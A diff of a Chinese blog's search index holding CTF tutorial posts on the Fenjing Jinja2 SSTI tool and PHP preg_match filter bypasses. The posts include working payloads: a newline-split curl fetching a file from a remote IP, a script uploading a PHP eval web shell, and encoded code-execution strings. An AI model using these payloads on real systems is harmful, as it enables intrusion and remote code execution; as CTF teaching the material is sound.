@@ -1,6 +1,31 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>fenjing</title>
+    <url>/2024/06/05/fenjing%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/</url>
+    <content><![CDATA[<h2 id="Fenjing-焚靖"><a href="#Fenjing-焚靖" class="headerlink" title="Fenjing(焚靖)"></a>Fenjing(焚靖)</h2><h3 id="fenjing介绍"><a href="#fenjing介绍" class="headerlink" title="fenjing介绍"></a>fenjing介绍</h3><p>&emsp;&emsp;焚靖是一个针对CTF比赛中Jinja2 SSTI绕过WAF的全自动脚本，可以自动攻击给定的网站或接口。能解决常规性的SSTI题目，实用指数⭐⭐⭐</p>
+<h3 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h3><p>&emsp;&emsp;在windows环境下安装最方便，本人尝试在kali安装失败了很多次，各种报错，最后放弃了。&emsp;(；′⌒&#96;)</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install fenjing -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>
+
+<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m fenjing scan --url &lt;URL:&gt;</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;该命令执行完毕后会反弹一个shell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m fenjing webui</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;会在本地弹出一个可视化操作页面，然后在根据要求填充和执行（方便新手去使用）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m fenjing crack --url &lt;URL:&gt; --method GET(POST) --inputs name(user)</span><br></pre></td></tr></table></figure>
+
+<p> &emsp;&emsp;一把梭（说实话还是上面两个命令好用些(／_＼)大怨种）</p>
+<p> &emsp;更为详细的在 <a href="https://gitcode.com/Marven11/Fenjing">here</a></p>
+]]></content>
+      <categories>
+        <category>工具|脚本 利用</category>
+      </categories>
+      <tags>
+        <tag>SSTI</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>md5绕过</title>
     <url>/2024/06/11/md5%E7%BB%95%E8%BF%87/</url>
     <content><![CDATA[<p>&emsp;&emsp;MD5绕过是web入门掌握的最基本的知识点，绕过的方法有以下几种</p>
@@ -42,28 +67,42 @@
       </tags>
   </entry>
   <entry>
-    <title>fenjing</title>
-    <url>/2024/06/05/fenjing%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/</url>
-    <content><![CDATA[<h2 id="Fenjing-焚靖"><a href="#Fenjing-焚靖" class="headerlink" title="Fenjing(焚靖)"></a>Fenjing(焚靖)</h2><h3 id="fenjing介绍"><a href="#fenjing介绍" class="headerlink" title="fenjing介绍"></a>fenjing介绍</h3><p>&emsp;&emsp;焚靖是一个针对CTF比赛中Jinja2 SSTI绕过WAF的全自动脚本，可以自动攻击给定的网站或接口。能解决常规性的SSTI题目，实用指数⭐⭐⭐</p>
-<h3 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h3><p>&emsp;&emsp;在windows环境下安装最方便，本人尝试在kali安装失败了很多次，各种报错，最后放弃了。&emsp;(；′⌒&#96;)</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install fenjing -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>
+    <title>preg_match正则绕过</title>
+    <url>/2024/06/12/preg-match%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87/</url>
+    <content><![CDATA[<p>&emsp;&emsp;正则匹配也是php中最常见的一种，一般用来做一个<del>装饰</del>匹配作用，我们通常用以下几种绕过方式来规避正则匹配。</p>
+<h3 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h3><p>&emsp;&emsp;正则匹配后面都会有一个修饰符，各位要判断相应的修饰符选择哪一种绕过方式，别无脑套，推荐一个网站<a href="https://www.jyshare.com/front-end/854/">正则表达式在线测试</a>,它提供了修饰符的介绍和语法参考，方便我们继续匹配。། – _ – །</p>
+<h3 id="换行符绕过（-0a）"><a href="#换行符绕过（-0a）" class="headerlink" title="换行符绕过（%0a）"></a>换行符绕过（%0a）</h3><p>&emsp;&emsp;通常的，preg_match()函数只能匹配一行数据，尤其是遇到这种情况<br><img data-src="/images/ciscn.png" alt="ciscn"><br>&emsp;&emsp;看着如此长的过滤，但因为修饰符只有一个i（忽略大小写），我们可以直接%0a绕过(过滤点的方式可以将IP转成十进制)</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cmd=cu%0arl+http://795973494:8000/s -o /tmp/s</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;简单的来说，当遇到修饰符只有i的时候，可以用换行符%0a秒了。</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">preg_match</span><span class="params">(<span class="string">&#x27;/^flag$/i&#x27;</span>, $_GET[<span class="string">&#x27;a&#x27;</span>])</span></span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;因此我们传入?a&#x3D;flag%0a即可绕过</p>
+<h3 id="利用数组绕过"><a href="#利用数组绕过" class="headerlink" title="利用数组绕过"></a>利用数组绕过</h3><p>&emsp;&emsp;同md5()函数原理，当参数是数组类型的时候，会以报错的形式来绕过判断。但值得一提的是，整个if条件不执行，如果里面是输出flag形式的，此方法无用。例如</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$a</span>)==<span class="literal">false</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;这种我们可以用数组进行绕过，绕if条件报错。</p>
+<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="string">?a</span>[]=flag.php</span><br></pre></td></tr></table></figure>
 
-<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m fenjing scan --url &lt;URL:&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="PCRE回溯限制绕过"><a href="#PCRE回溯限制绕过" class="headerlink" title="PCRE回溯限制绕过"></a>PCRE回溯限制绕过</h3><p>&emsp;&emsp;如何绕过呢，让回溯次数超过最大限制就可以使preg_match()函数返回false，从而绕过限制，中文的回溯次数在100万次就好崩溃，这个回溯保护使PHP为了防止关于正则表达式的DDOS<br>payload:<br>GET:</p>
+<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">import</span> <span class="variable">requests</span></span><br><span class="line"><span class="variable">from</span> <span class="variable">io</span> <span class="variable">import</span> <span class="variable">BytesIO</span></span><br><span class="line"><span class="variable">payload</span> =<span class="function"><span class="title">BytesIO</span>(<span class="variable">b</span><span class="string">&#x27;[]&#x27;</span>+<span class="variable">b</span><span class="string">&#x27;a&#x27;</span>*<span class="number">1000000</span>)</span></span><br><span class="line"><span class="variable">res</span> = <span class="variable">requests.get</span>(<span class="string">&#x27;[]?[]=&#x27;</span>+<span class="function"><span class="title">str</span>(<span class="variable">payload</span>))</span></span><br><span class="line"><span class="function"><span class="title">print</span>(<span class="variable">res.text</span>)</span></span><br></pre></td></tr></table></figure>
+<p>POST:  </p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="keyword">from</span> io import BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">&#x27;file&#x27;</span>: BytesIO(b<span class="string">&#x27;aaa&lt;?php eval($_POST[txt]);//&#x27;</span> + b<span class="string">&#x27;a&#x27;</span> * 1000000)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">&#x27;[]&#x27;</span>, <span class="attribute">files</span>=files, <span class="attribute">allow_redirects</span>=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(res.headers)</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;[]即代表根据题目来填充</p>
+<h3 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h3><p>&emsp;&emsp;就是通过URL编码进行取反绕过，当然其他编码也是可以的，进制就更不用说了（通常使用十六进制），这里略微举个例子</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&quot;phpinfo&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>取反得到%8F%97%8F%96%91%99%90（取反使用的使不可见字符，遇到&#x2F;s还是得寄）</p>
+<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">?code=$_=~(%8F%97%8F%96%91%99%90);$_();</span><br></pre></td></tr></table></figure>
 
-<p>&emsp;&emsp;该命令执行完毕后会反弹一个shell</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m fenjing webui</span><br></pre></td></tr></table></figure>
 
-<p>&emsp;&emsp;会在本地弹出一个可视化操作页面，然后在根据要求填充和执行（方便新手去使用）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m fenjing crack --url &lt;URL:&gt; --method GET(POST) --inputs name(user)</span><br></pre></td></tr></table></figure>
-
-<p> &emsp;&emsp;一把梭（说实话还是上面两个命令好用些(／_＼)大怨种）</p>
-<p> &emsp;更为详细的在 <a href="https://gitcode.com/Marven11/Fenjing">here</a></p>
+<h3 id="5c绕过"><a href="#5c绕过" class="headerlink" title="%5c绕过"></a>%5c绕过</h3><p>&emsp;&emsp;这个不常见，%5c其实就是”\“,了解以下就可以了</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">preg_match</span><span class="params">(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$act</span>)</span></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">/i</span>不区分大小写</span><br><span class="line"></span><br><span class="line"><span class="string">/s</span>匹配任何不可见字符，包括空格、制表符、换页符等等，等价于[fnrtv]</span><br><span class="line"></span><br><span class="line"><span class="string">/D</span>如果使用$限制结尾字符,则不允许结尾有换行;</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;这里存在&#x2F;s和&#x2F;D因此它会匹配到换行，%0a因此就无法绕过。这时候就可以使用%5c</p>
+<h3 id="单引号绕过"><a href="#单引号绕过" class="headerlink" title="单引号绕过"></a>单引号绕过</h3><p>&emsp;&emsp;这个也不常用，在每一个字符前加上单引号可以绕过preg_match的匹配。<br><img data-src="/images/%E5%8D%95%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87.png" alt="单引号绕过"></p>
 ]]></content>
       <categories>
-        <category>工具|脚本 利用</category>
+        <category>PHP</category>
       </categories>
       <tags>
-        <tag>SSTI</tag>
+        <tag>绕过</tag>
       </tags>
   </entry>
   <entry>
@@ -89,45 +128,6 @@
       </categories>
       <tags>
         <tag>SSTI</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>preg_match正则绕过</title>
-    <url>/2024/06/12/preg-match%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87/</url>
-    <content><![CDATA[<p>&emsp;&emsp;正则匹配也是php中最常见的一种，一般用来做一个<del>装饰</del>匹配作用，我们通常用以下几种绕过方式来规避正则匹配。</p>
-<h3 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h3><p>&emsp;&emsp;正则匹配后面都会有一个修饰符，各位要判断相应的修饰符选择哪一种绕过方式，别无脑套། – _ – །，推荐一个网站<a href="https://www.jyshare.com/front-end/854/">正则表达式在线测试</a>,它提供了修饰符的介绍和语法参考，方便我们继续匹配。</p>
-<h3 id="换行符绕过（-0a）"><a href="#换行符绕过（-0a）" class="headerlink" title="换行符绕过（%0a）"></a>换行符绕过（%0a）</h3><p>&emsp;&emsp;通常的，preg_match()函数只能匹配一行数据，尤其是遇到这种情况<br><img data-src="https://img-blog.csdnimg.cn/img_convert/aeedb45d9886555951b4d33229c49cc8.png" alt="ciscn"><br>&emsp;&emsp;看着如此长的过滤，但因为修饰符只有一个i（忽略大小写），我们可以直接%0a绕过</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cmd=cu%0arl+http://795973494:8000/s -o /tmp/s</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;简单的来说，当遇到修饰符只有i的时候，可以用换行符%0a秒了。</p>
-<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">preg_match</span><span class="params">(<span class="string">&#x27;/^flag$/i&#x27;</span>, $_GET[<span class="string">&#x27;a&#x27;</span>])</span></span></span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;因此我们传入?a&#x3D;flag%0a即可绕过</p>
-<h3 id="利用数组绕过"><a href="#利用数组绕过" class="headerlink" title="利用数组绕过"></a>利用数组绕过</h3><p>&emsp;&emsp;同md5()函数原理，当参数是数组类型的时候，会以报错的形式来绕过判断。但值得一提的是，整个if条件不执行，如果里面是输出flag形式的，此方法无用。例如</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$a</span>)==<span class="literal">false</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;这种我们可以用数组进行绕过，绕if条件报错。</p>
-<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">a</span>=flag.php</span><br></pre></td></tr></table></figure>
-
-<h3 id="PCRE回溯限制绕过"><a href="#PCRE回溯限制绕过" class="headerlink" title="PCRE回溯限制绕过"></a>PCRE回溯限制绕过</h3><p>&emsp;&emsp;如何绕过呢，让回溯次数超过最大限制就可以使preg_match()函数返回false，从而绕过限制，中文的回溯次数在100万次就好崩溃，这个回溯保护使PHP为了防止关于正则表达式的DDOS<br>payload:<br>GET:</p>
-<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">import</span> <span class="variable">requests</span></span><br><span class="line"><span class="variable">from</span> <span class="variable">io</span> <span class="variable">import</span> <span class="variable">BytesIO</span></span><br><span class="line"><span class="variable">payload</span> =<span class="function"><span class="title">BytesIO</span>(<span class="variable">b</span><span class="string">&#x27;[]&#x27;</span>+<span class="variable">b</span><span class="string">&#x27;a&#x27;</span>*<span class="number">1000000</span>)</span></span><br><span class="line"><span class="variable">res</span> = <span class="variable">requests.get</span>(<span class="string">&#x27;[]?[]=&#x27;</span>+<span class="function"><span class="title">str</span>(<span class="variable">payload</span>))</span></span><br><span class="line"><span class="function"><span class="title">print</span>(<span class="variable">res.text</span>)</span></span><br></pre></td></tr></table></figure>
-<p>POST:  </p>
-<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="keyword">from</span> io import BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">&#x27;file&#x27;</span>: BytesIO(b<span class="string">&#x27;aaa&lt;?php eval($_POST[txt]);//&#x27;</span> + b<span class="string">&#x27;a&#x27;</span> * 1000000)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">&#x27;[]&#x27;</span>, <span class="attribute">files</span>=files, <span class="attribute">allow_redirects</span>=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(res.headers)</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;[]即代表根据题目来填充</p>
-<h3 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h3><p>&emsp;&emsp;就是通过URL编码进行取反绕过，当然其他编码也是可以的，进制就更不用说了（通常使用十六进制），这里略微举个例子</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&quot;phpinfo&quot;</span>);</span><br></pre></td></tr></table></figure>
-<p>取反得到%8F%97%8F%96%91%99%90（取反使用的使不可见字符，遇到&#x2F;s函数得寄）</p>
-<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">?code$_=~(%8F%97%8F%96%91%99%90);$_();</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="5c绕过"><a href="#5c绕过" class="headerlink" title="%5c绕过"></a>%5c绕过</h3><p>&emsp;&emsp;这个不常见，%5c其实就是”&quot;,了解以下就可以了</p>
-<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">preg_match</span><span class="params">(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$act</span>)</span></span></span><br></pre></td></tr></table></figure>
-<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">/i</span>不区分大小写</span><br><span class="line"></span><br><span class="line"><span class="string">/s</span>匹配任何不可见字符，包括空格、制表符、换页符等等，等价于[fnrtv]</span><br><span class="line"></span><br><span class="line"><span class="string">/D</span>如果使用$限制结尾字符,则不允许结尾有换行;</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;这里存在&#x2F;s和&#x2F;D因此它会匹配到换行，%0a因此就无法绕过。这时候就可以使用%5c</p>
-<h3 id="单引号绕过"><a href="#单引号绕过" class="headerlink" title="单引号绕过"></a>单引号绕过</h3><p>&emsp;&emsp;这个也不常用，在每一个字符前加上单引号可以绕过preg_match的匹配。<br><img data-src="/images/%E5%8D%95%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87.png" alt="单引号绕过"></p>
-]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>绕过</tag>
       </tags>
   </entry>
 </search>
